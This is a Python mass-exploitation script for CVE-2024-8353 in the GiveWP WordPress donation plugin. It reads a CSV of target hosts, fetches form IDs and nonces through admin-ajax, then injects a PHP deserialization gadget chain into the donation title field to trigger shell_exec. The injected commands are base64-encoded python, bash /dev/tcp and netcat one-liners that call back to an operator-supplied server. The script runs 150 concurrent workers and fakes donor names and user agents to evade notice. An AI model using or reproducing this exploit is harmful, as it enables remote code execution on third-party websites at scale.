import asyncio
import base64
import csv
import random
import time
from functools import wraps

import httpx
from faker import Faker

from acetylate_poc.schemas.cli_args import ArgOptionDetails, CommandArgsSchema
from acetylate_poc.utils.manage import GeneralToolsBox
from acetylate_poc.utils.script import build_argparse

FAKE = Faker()
TIMEOUT = 12.0

server_host = None
server_port = None

first_exec_cmd = r'\O:19:"Stripe\\\\StripeObject":1:{s:10:"\0*\0_values";a:1:{s:3:"foo";O:62:"Give\\\\PaymentGateways\\\\DataTransferObjects\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\0*\0container";O:33:"Give\\\\Vendors\\\\Faker\\\\ValidGenerator":3:{s:12:"\0*\0validator";s:10:"shell_exec";s:12:"\0*\0generator";O:34:"Give\\\\Onboarding\\\\SettingsRepository":1:{s:11:"\0*\0settings";a:1:{'  # noqa: E501
last_exec_cmd = r'}}s:13:"\0*\0maxRetries";i:10;}}}}}}'

def timeit(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        start_time = time.monotonic()
        result = await func(*args, **kwargs)
        end_time = time.monotonic()
        print(f"Execution time: {end_time - start_time:.2f} seconds")
        return result
    return wrapper

def csv_file_iterator(filename):
    with open(filename, 'r', encoding="utf-8-sig") as file:
        reader = csv.DictReader(file)
        for row in reader:
            yield row

def fix_host(host, protocol, ip, port):
    if not host:
        host = f"{protocol}://{ip}" if port in ["80", "443"] else f"{protocol}://{ip}:{port}"
    if not ("http" in host or "https" in host):
        host = f"{protocol}://{host}" if port in ["80", "443"] else f"{protocol}://{host}:{port}"
    return host

async def exploit(client: httpx.AsyncClient, target):
    host = target.get("host")
    protocol = target.get("protocol")
    ip = target.get("ip")
    domain = target.get("domain")
    port = target.get("port")

    base_url = GeneralToolsBox.fix_base_url(host, protocol, ip, domain, port)
    url = f"{base_url}/wp-admin/admin-ajax.php"

    info = None
    error = None
    try:
        nonce = None
        form_id = None

        await asyncio.sleep(0.5)
        payload = {
            'action': 'give_form_search'
        }
        response = await client.post(url, data=payload, timeout=TIMEOUT)
        response.raise_for_status()
        if response.status_code == 200:
            data = response.json()
            ids = [item['id'] for item in data]
            names = [item['name'] for item in data]
            form_id = random.choice(ids)  # noqa: S311
            info = f"[-] [{response.status_code}]\t[{host}] Form ID: {form_id}\n{ids}\n{names}\n{data}"
        else:
            info = f"[-] [{response.status_code}]\t[{host}] Failed: \n{data}"
        
        if form_id:
            await asyncio.sleep(0.5)
            payload = {
                'action': 'give_donation_form_nonce',
                'give_form_id': form_id
            }
            response = await client.post(url, data=payload, timeout=TIMEOUT)
            response.raise_for_status()
            if response.status_code == 200:
                data = response.json()
                nonce = data['data']
                info = f"{info}\n[-] [{response.status_code}]\t[{host}] Find Nonce: {nonce}\n{data}"
            else:
                info = f"{info}\n[-] [{response.status_code}]\t[{host}] Failed: \n{data}"
        
        if nonce:

            test_python = f"find /usr/bin -name \"python*\" | grep -E \"python(3|2)\\.?[0-9]*$\" | xargs -I {{}} sh -c '{{}} -c \"import socket; s=socket.socket(); s.connect((\\\"{server_host}\\\", {server_port})); s.sendall(b\\\"{host}\\\"); s.close()\" && exit 0'"  # noqa: E501
            test_bash = f"bash -c 'exec 3<>/dev/tcp/{server_host}/{server_port};echo -en \"{host}\" >&3;exec 3>&-'"
            test_nc = f"echo -en '{host}' | {{nc {server_host} {server_port} || netcat {server_host} {server_port};}}"
            cmds = [
                f"echo '{base64.b64encode(test_python.encode()).decode()}' | base64 -d | sh",
                f"echo '{base64.b64encode(test_bash.encode()).decode()}' | base64 -d | sh",
                f"echo '{base64.b64encode(test_nc.encode()).decode()}' | base64 -d | sh",
            ]
            
            for cmd in cmds:
                await asyncio.sleep(0.8)
                exec_cmd = f'{first_exec_cmd}s:8:"address1";s:{len(cmd)}:"{cmd}";{last_exec_cmd}'
                payload = {
                    "action" : "give_process_donation",
                    "give-form-id" : form_id, 
                    "give-form-hash" : nonce, 
                    "give-price-id" : "0",
                    "give-amount" : "10",
                    "give-gateway": "offline",
                    "give_first": FAKE.first_name(),
                    "give_last": FAKE.last_name(),
                    "give_email": FAKE.email(),
                    "give_title": exec_cmd
                }
                headers = {
                    'User-Agent': FAKE.user_agent(),
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
                response = await client.post(url, data=payload, headers=headers, timeout=TIMEOUT)
                response.raise_for_status()
                if response.status_code == 200:
                    info = f"{info}\n[+] [{response.status_code}]\t[{host}]"

    except httpx.HTTPStatusError as exc:
        error = f"[-] [{exc.response.status_code}]\t[{host}] {exc}"
    except httpx.TimeoutException:
        error = f"[-] [Timeout]\t[{host}] Request timed out."
    except httpx.NetworkError as exc:
        error = f"[-] [Network Error]\t[{host}] {exc}"
    except Exception as exc:
        error = f"[-] [Error]\t[{host}] {exc}"
    finally:
        if info and error:
            result = f"{info}\n{error}"
        elif info and error is None:
            result = info
        elif error and info is None:
            result = error
        else:
            result = "[?] ??? ??? ???"

        return result  # noqa: B012


async def request_task(task_name, queue):
    async with httpx.AsyncClient(verify=False) as client:  # noqa: S501
        while True:
            target = await queue.get()
            if target:
                result = await exploit(client, target)
                print(f"[{task_name}] {result}")
            queue.task_done()

@timeit
async def main(csv_file, server, queue_size=8000, task_num=150):

    if server:
        global server_host, server_port
        server_host, server_port = server.split(":")
    else:
        print("Please provide a server address.")
        exit(1)

    queue = asyncio.Queue(queue_size)

    tasks = []
    zfill_length = len(str(task_num))
    for i in range(task_num):
        task = asyncio.create_task(request_task(f'task-{i:0{zfill_length}d}', queue))
        tasks.append(task)

    for target in csv_file_iterator(csv_file):
        queue.put_nowait(target)

        if queue.full():
            await queue.join()

    if not queue.empty():
        await queue.join()

    for task in tasks:
        task.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)


if __name__ == '__main__':

    args = build_argparse(CommandArgsSchema(
        description=(
            "CVE-2024-8353"
        ),
        required=["file", "server"],
        options={
            "file": ArgOptionDetails(
                short_name="f",
                arg_type="str",
                arg_help="csv file"
            ),
            "server": ArgOptionDetails(
                short_name="s",
                arg_type="str",
                arg_help="server name"
            )
        }
    )).parse_args()
    if args.file and args.server:
        asyncio.run(main(args.file, args.server))